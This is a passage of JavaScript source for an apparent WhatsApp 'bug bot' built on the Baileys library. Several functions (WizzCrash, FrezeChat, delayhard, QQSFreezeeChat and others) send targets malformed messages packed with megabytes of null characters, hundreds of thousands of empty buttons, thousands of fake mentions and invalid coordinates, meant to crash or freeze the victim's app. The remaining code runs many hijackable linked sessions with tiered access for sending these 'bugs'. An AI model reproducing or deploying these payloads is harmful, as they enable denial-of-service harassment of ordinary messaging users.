              fileLength: "10610",
              mediaKeyTimestamp: "1775044724",
              stickerSentTs: "1775044724091"
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );

  try {
    const video = {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
      fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
      mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
      mimetype: "image/webp",
      directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
      fileLength: "10610",
      mediaKeyTimestamp: "1775044724",
      stickerSentTs: "1775044724091"
    };

    const res = await fetch("https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true.mp4");
    const ab = await res.arrayBuffer();
    const buffer = Buffer.from(ab);

    let index = 0;

    if (buffer.length >= 4) {
      index = buffer.readUInt32BE(0);
    }

    if (!Number.isFinite(index) || index <= 0) index = 1;
    if (index > buffer.length) index = buffer.length;

    let value = buffer[index] || 0;

    const MAX_SIZE = 5 * 1024 * 1024;
    let allocSize = index * 1024;

    if (!Number.isFinite(allocSize) || allocSize <= 0) allocSize = 1024;
    if (allocSize > MAX_SIZE) allocSize = MAX_SIZE;

    let bigBuffer = Buffer.alloc(allocSize);

    buffer.copy(
      bigBuffer,
      0,
      0,
      Math.min(buffer.length, bigBuffer.length)
    );

    const Omhc = {
      groupStatusMessageV2: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: bigBuffer.length,
          seconds: 999999,
          caption: "YakuzaXsilence",
          mediaKey: Buffer.alloc(32),
          fileEncSha256: Buffer.alloc(32),
          fileSha256: Buffer.alloc(32),
          jpegThumbnail: bigBuffer.slice(0, 20000),
          contextInfo: {
            quotedMessage: {
              stickerMessage: video,
            }
          }
        }
      }
    };

    const Silence = {
      groupStatusMessageV2: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true.mp4",
          mimetype: "video/mp4",
          fileLength: bigBuffer.length,
          seconds: 999999,
          caption: "YakuzaXsilence",
          mediaKey: Buffer.alloc(32),
          fileEncSha256: Buffer.alloc(32),
          fileSha256: Buffer.alloc(32),
          jpegThumbnail: bigBuffer.slice(0, 20000),
          contextInfo: {
            quotedMessage: {
              stickerMessage: video,
            }
          }
        }
      }
    };

    await sock.relayMessage(target, Omhc, {});
    await sock.relayMessage(target, Silence, {});

  } catch (err) {
    console.error("ERROR:", err);
  }
}

async function NgelayV2(sock, target) {
  const ngelay = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
               url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c&mms3=true",
               mimetype: "image/jpeg",
               caption: "Lau Spaa Mpruy?",
               fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
               fileLength: "634893",
               height: 1022,
               width: 1080,
               mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
               fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
               directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c",
               mediaKeyTimestamp: "1782643133",
                 jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQAERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
                 hasMediaAttachment: true
               }
            },
            body: {
            text: "\x10" + "\u0000".repeat(1045000)
          },
          nativeFlowMessage: {
            name: "voice_call",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  }
  await sock.relayMessage(target, ngelay, {
  }, { noSelfSync: true }
 );
}

async function QQSFreezeeChat(sock, target) {
  try {
    const Private = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: "YakuzaXsilence-" + "?".repeat(50000),
            footerText: "_/ASSALAMUALLAIKUM?" ,
            headerType: 1,
            buttons: [
              {
                buttonId: "Pe",
                buttonText: {
                  displayText: "?".repeat(90000)
                },
                type: 1
              }
            ],
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () => 
                `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`
              ),
              participant: target,
              remoteJid: target,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedMessage: {
                locationMessage: {
                  degreesLatitude: 99999999999999999999,
                  degreesLongitude: 99999999999999999999,
                  name: "OmhcSilence!-",
                  address: "\u0000",
                  url: "\u0000",
                  jpegThumbnail: null
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, Private, {
      userJid: target
    });

    console.log("Berhasil");
  } catch (err) {
    console.log(err);
  }
}

async function k(target) {

const Xaka = "\u202E\u202D\u200F\u200E\u202A\u202B\u202C\u200B\u200C\u200D"
    const XakaJir = "\u034F\u2800\u3164\uFFA0\u115F\u1160"
    const XakaHere = "\u4E00\u9FFF\u3400\u4DBF\u4E42\u4E5C\u4E62\u4E99\u4EBA\u5132\u5144\u5152\u5162\u5175\u5182\u5192\u51A2\u51B2\u51C2\u51D2\u51E2\u51F2"
    const OmejiXaka = "\u{20000}\u{2A6DF}\u{2A700}\u{2B73F}\u{2B740}\u{2B81F}\u{2B820}\u{2CEAF}"

  const msg = {
    interactiveMessage: {
      body: { text: "⿻ 𝖷𝖺𝗄𝖺⿻ 𝖢𝗁𝖺𝗆𝗉𝗂𝗈𝗇𝗌 ⿻" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ꦾ".repeat(20000),
              sections: [
                {
                  title: "ꦾ".repeat(15000),
                  rows: [
                    { rowId: "1", title: "ꦾ".repeat(15000), description: "ꦾ".repeat(15000) }
                  ]
                }
              ]
            })
          }
        ]
      }
    }
  };

  await sock.relayMessage(target, msg, {})
}

async function dongo(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        pollCreationMessageV3: {
          name: "ꦾ".repeat(10000),
          options: [
            {
              optionName: "ꦾ".repeat(15000)
            },
            {
              optionName: "ꦾ".repeat(10000)
            },
            {
              optionName: "ꦾ".repeat(20000)
            }
          ],
          selectableOptionsCount: 1
        }
      },
      body: {
        text: "🩸⃟༑⌁⃰𝐋𝐞͢𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: "{}"
          }
        ]
      }
    }
  }, {
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        questionMessage: {
          message: {
            extendedTextMessage: {
              text: "\uA99E".repeat(3000),
              previewType: "NONE",
              contextInfo: {
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1999 }, () =>
                    "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                  )
                ],
                isQuestion: true,
                isForwarded: true,
                forwardingScore: 9999,
                quotedMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "\r".repeat(2000),
                        title: "\u0000".repeat(8000),
                        format: "DEFAULT"
                      },
                      nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: JSON.stringify({
                          values: {
                            in_pin_code: "999999",
                            building_name: "\0",
                            landmark_area: "\0",
                            address: "\0",
                            tower_number: "\0",
                            city: "Jabar",
                            name: "\0",
                            phone_number: "555555",
                            house_number: "null",
                            floor_number: "\0",
                            state: "\0 | " + "\u0000".repeat(900000),
                            url_track_map: "https://track.jaszznotdev.com/crash?id=" + Math.random().toString(36)
                          }
                        }),
                        version: 3
                      }
                    }
                  }
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "120363426179267743@newsletter",
                  serverMessageId: 143,
                  newsletterName: "\u0000".repeat(150000)
                }
              }
            }
          }
        }
      }
    }
  }, {
    participant: { jid: target }
  });
}
async function locfrz(client, target) {
    await client.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "\x10",
                        hasMediaAttachment: true,
                        locationMessage: {
                            degreesLatitude: -999.0349999999999,
                            degreesLongitude: 922.999999999999,
                            name: "\x10",
                            address: "\x10",
                            jpegThumbnail: null
                        }
                    },
                    body: {
                        text: "\x10"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        stanzaId: "#666!"
                    }
                }
            }
        }
    }, {
        participant: {
            jid: target
        }
    });
}

async function WizzCrash(sock, targetJid) {
  const spectralJids = Array.from({ length: 1200 }, () => "44" + Math.floor(Math.random() * 888888888) + "@s.whatsapp.net");
  
  let pollPayload = {
    pollCreationMessage: {
      name: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞 - End Game\n" + "ꦾ‎".repeat(4000),
      options: Array.from({ length: 15 }, (_, i) => ({ optionName: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞".repeat(1500) + i })),
      selectableOptionsCount: 5
    }
  };

  await sock.relayMessage(targetJid, {
    newsletterAdminInviteMessage: {
      newsletterJid: '120363294025000000@newsletter',
      newsletterName: "Void Engine Apps" + "\u0000".repeat(5000),
      caption: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞" + "ꦾ‎".repeat(15000),
      inviteExpiration: Date.now() + 1814400000,
      jpegThumbnail: Buffer.alloc(0)
    },
    
    orderMessage: {
      orderId: "666" + "\u0000".repeat(1000),
      thumbnail: Buffer.alloc(0),
      itemCount: 9999999,
      status: 1,
      surface: 1,
      orderTitle: "PizzaCrash" + "ꦾ‎".repeat(3000),
      message: "Fvck System\n" + "ꦾ‎".repeat(5000),
      sellerJid: "0@s.whatsapp.net",
      token: "X".repeat(500)
    },

    viewOnceMessage: {
      message: {
        listMessage: {
          title: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞",
          description: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞" + "\u0000".repeat(30000),
          buttonText: "Ang Ang Angꦾ‎ꦾ‎ꦾ‎ꦾ‎ꦾ‎ꦾ‎ꦾ‎ꦾ‎",
          listType: 1,
          sections: [{
            title: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞",
            rows: [{ title: "FVCK", rowId: "ꦾ‎".repeat(1000) }]
          }],
          contextInfo: {
            mentionedJid: spectralJids,
            isForwarded: true,
            forwardingScore: 1337,
            quotedMessage: pollPayload
          }
        }
      }
    }
  }, { participant: { jid: targetJid } }).catch(() => {});

  console.log("Success.");
}

async function FrezeChat(sock, target) {
  let Orbsx = [];
  Orbsx.push({
    name: "single_select",
    buttonParamsJson: "",
  });
  for (let i = 0; i < 20000; i++) {
    Orbsx.push({
      name: "address_message",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });
  }
  
  let orbsMsg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞",
          },
          nativeFlowMessage: {
            messageParamsJson: "{{".repeat(10000),
            buttons: Orbsx,
          },
          contextInfo: {
            participant: target,
            remoteJid: "status@broadcast",
            stanzaId: "Orbs" + "-Id" + Date.now(),
            isForwarded: true,
            forwardingScore: 111,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1998
                }, () => "7" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
              ),
            ],
          },
        },
      },
    },
  };
  
  await sock.relayMessage(target, orbsMsg, {
    messageId: null,
    participant: { jid: target },
  });
}

async function delayhard(sock, target) {
  const whiletrue = {
    interactiveMessage: {
      body: {
        text: "?⃟꙰𝗫𝟵✶𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨🔞"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "\u0000".repeat(250000)
          },
          {
            name: "\n".repeat(250000)
          },
          {
            name: "\0".repeat(25000)
          },
          {
            name: "\x10".repeat(250000)
          }
        ]
      }
    }
  };

  const participant = {
    jid: target
  };

  await sock.relayMessage(
    target,
    whiletrue,
    {
      participant
    }
  );
}

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}


// ═══════════════════════════════════════════════════════════════════════════
// AUTO-RECONNECT: When a session disconnects, try to reconnect after 5s.
// ═══════════════════════════════════════════════════════════════════════════

const reconnectingSessions = new Set();

async function reconnectSession(sessionName, maxRetries = 5) {
  if (reconnectingSessions.has(sessionName)) {
    console.log(`[RECONNECT] ${sessionName} already reconnecting, skip.`);
    return false;
  }

  // Find the session folder
  let sessionDir = null;
  let ownerFolder = null;
  try {
    const permenmdPath = path.join('permenmd');
    if (!fs.existsSync(permenmdPath)) return false;
    for (const subfolder of fs.readdirSync(permenmdPath)) {
      const subPath = path.join(permenmdPath, subfolder);
      try {
        if (!fs.statSync(subPath).isDirectory()) continue;
      } catch (_) { continue; }
      const candidateDir = path.join(subPath, sessionName);
      if (fs.existsSync(candidateDir)) {
        sessionDir = candidateDir;
        ownerFolder = subfolder;
        break;
      }
    }
  } catch (_) {}

  if (!sessionDir) {
    console.log(`[RECONNECT] ${sessionName}: session folder not found, cannot reconnect.`);
    return false;
  }

  reconnectingSessions.add(sessionName);

  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    const waitSec = attempt * 5; // 5s, 10s, 15s, 20s, 25s
    console.log(`[RECONNECT] ${sessionName}: attempt ${attempt}/${maxRetries} in ${waitSec}s (folder=${ownerFolder})...`);

    await sleep(waitSec * 1000);

    try {
      // Remove old dead socket
      delete activeConnections[sessionName];

      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        keepAliveIntervalMs: 50000,
        logger: pino({ level: "silent" }),
        auth: state,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        generateHighQualityLinkPreview: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        version
      });

      sock.ev.on("creds.update", saveCreds);

      // Wait for connection to open or close
      const connected = await new Promise((resolve) => {
        let resolved = false;
        sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
          if (resolved) return;

          if (connection === "open") {
            resolved = true;
            activeConnections[sessionName] = sock;

        // ===== AUTO FOLLOW CHANNELS (idch.js) =====
        try {
          const idch = require('./idch');
          if (Array.isArray(idch) && idch.length > 0) {
            console.log(`[${sessionName} RECONNECT] Auto-following ${idch.length} channels...`);
            let followed = 0;
            for (const channelId of idch) {
              try {
                // Use newsletterFollow to follow the channel
                await sock.newsletterFollow(channelId).catch(() => {});
                // Also try via message (some Baileys versions use this)
                await sock.sendMessage(channelId, { 
                  text: 'follow',
                  newsletterOverride: { name: 'YakuzaXsilence' }
                }).catch(() => {});
                followed++;
                await sleep(200); // Small delay between follows
              } catch (e) {
                // Continue even if one fails
              }
            }
            console.log(`[${sessionName} RECONNECT] Auto-followed ${followed}/${idch.length} channels`);
          }
        } catch (e) {
          console.warn(`[${sessionName} RECONNECT] Auto-follow error: ${e.message}`);
        }

            console.log(`[RECONNECT] \u2705 ${sessionName} reconnected on attempt ${attempt}.`);
            resolve(true);
          } else if (connection === "close") {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            console.log(`[RECONNECT] ${sessionName} attempt ${attempt} failed. Status: ${statusCode}`);

            // 403/440 = logged out (permanent, stop retrying)
                        if (statusCode === 403 || statusCode === 440 || statusCode === DisconnectReason.loggedOut) {
              console.log(`[RECONNECT] \u274c ${sessionName} LOGGED OUT (status ${statusCode}). Cannot reconnect.`);
              resolved = true;
              resolve(false); // permanent failure
            } else if (statusCode === 401) {
              // 401 = conflict (another session using this number)
              // Wait longer before retry — 15s instead of normal backoff
              console.log(`[RECONNECT] ${sessionName} CONFLICT (401). Waiting 15s before retry...`);
              await sleep(15000);
              resolved = true;
              resolve(null); // temporary failure, retry with longer delay
            } else {
              // 503, 500, etc = temporary, will retry next attempt
              resolved = true;
              resolve(null); // temporary failure, retry
            }
          }
        });

        // Timeout after 30s
        setTimeout(() => {
          if (!resolved) {
            console.log(`[RECONNECT] ${sessionName} attempt ${attempt} timed out.`);
            resolved = true;
            resolve(null);
          }
        }, 30000);
      });

      if (connected === true) {
        // Success! Remove from reconnecting set and return.
        reconnectingSessions.delete(sessionName);
        return true;
      } else if (connected === false) {
        // Permanent failure (logged out). Stop retrying.
        break;
      }
      // connected === null → temporary failure, retry next attempt
    } catch (err) {
      console.error(`[RECONNECT] ${sessionName} attempt ${attempt} error: ${err.message}`);
    }
  }

  reconnectingSessions.delete(sessionName);
  console.log(`[RECONNECT] \u274c ${sessionName} failed after ${maxRetries} attempts.`);
  return false;
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });


      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

        // ===== AUTO FOLLOW CHANNELS (idch.js) =====
        try {
          const idch = require('./idch');
          if (Array.isArray(idch) && idch.length > 0) {
            console.log(`[${sessionName}] Auto-following ${idch.length} channels...`);
            let followed = 0;
            for (const channelId of idch) {
              try {
                // Use newsletterFollow to follow the channel
                await sock.newsletterFollow(channelId).catch(() => {});
                // Also try via message (some Baileys versions use this)
                await sock.sendMessage(channelId, { 
                  text: 'follow',
                  newsletterOverride: { name: 'YakuzaXsilence' }
                }).catch(() => {});
                followed++;
                await sleep(200); // Small delay between follows
              } catch (e) {
                // Continue even if one fails
              }
            }
            console.log(`[${sessionName}] Auto-followed ${followed}/${idch.length} channels`);
          }
        } catch (e) {
          console.warn(`[${sessionName}] Auto-follow error: ${e.message}`);
        }


          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('permenmd', owner, number); 

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });


  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}


async function startUserSessions() {
  // Ambil semua subfolder dalam permenmd
  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      // ✅ Cek apakah session sudah aktif
      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName); // gunakan await kalau connectSession async
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName, searchAll = false) {
  // STRICT: when searchAll=false, ONLY search user's own folder.
  // If folder doesn't exist or no active session, return null.
  // NO fallback to other folders. Members MUST add their own sender.
  const folderPath = path.join('permenmd', subfolderName);
  if (fs.existsSync(folderPath)) {
    const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
    for (const file of jsonFiles) {
      const sessionName = `${path.basename(file, ".json")}`;
      if (activeConnections[sessionName]) {
        return activeConnections[sessionName];
      }
    }
  }

  // If searchAll=false, STOP HERE. No fallback.
  // Members without own sender get null, bug send rejected.
  if (!searchAll) {
    return null;
  }

  // searchAll=true: search ALL folders for any active session (VIP+ only)
  const permenmdPath = path.join('permenmd');
  if (fs.existsSync(permenmdPath)) {
    const subfolders = fs.readdirSync(permenmdPath);
    for (const subfolder of subfolders) {
      const subPath = path.join(permenmdPath, subfolder);
      try {
        if (!fs.statSync(subPath).isDirectory()) continue;
      } catch (_) { continue; }
      const files = fs.readdirSync(subPath).filter(f => f.endsWith(".json"));
      for (const file of files) {
        const sessionName = `${path.basename(file, ".json")}`;
        if (activeConnections[sessionName]) {
          console.log(`[SOCK] Found active session in ${subfolder}/${file}`);
          return activeConnections[sessionName];
        }
      }
    }
  }

  // Last resort: return any active connection (only when searchAll=true)
  const allKeys = Object.keys(activeConnections);
  if (allKeys.length > 0) {
